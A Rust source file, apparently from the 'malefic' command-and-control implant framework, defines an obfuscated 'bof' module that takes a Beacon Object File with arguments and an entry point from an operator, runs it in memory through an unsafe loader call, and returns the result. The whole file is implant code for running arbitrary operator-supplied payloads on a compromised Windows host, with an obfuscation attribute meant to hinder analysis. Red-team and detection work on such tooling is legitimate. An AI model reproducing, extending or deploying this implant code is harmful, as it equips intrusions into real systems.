use crate::prelude::*;
use malefic_os_win::kit::bof::bof_loader;
use malefic_proto::proto::modulepb::BinaryResponse;

pub struct ExecuteBof {}

#[async_trait]
#[module_impl("bof")]
impl Module for ExecuteBof {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for ExecuteBof {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let bin = &request.bin;
        let args = &request.args;
        let ep: Option<String>;
        if request.entry_point.is_empty() {
            ep = None
        } else {
            ep = Some(request.entry_point)
        }
        let result: Vec<u8>;
        unsafe {
            let ret = bof_loader(bin, args, ep);
            result = ret.as_bytes().to_vec();
        }

        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(BinaryResponse {
                status: 0,
                message: Vec::new(),
                data: result,
                err: "".to_string(),
            }),
        ))
    }
}
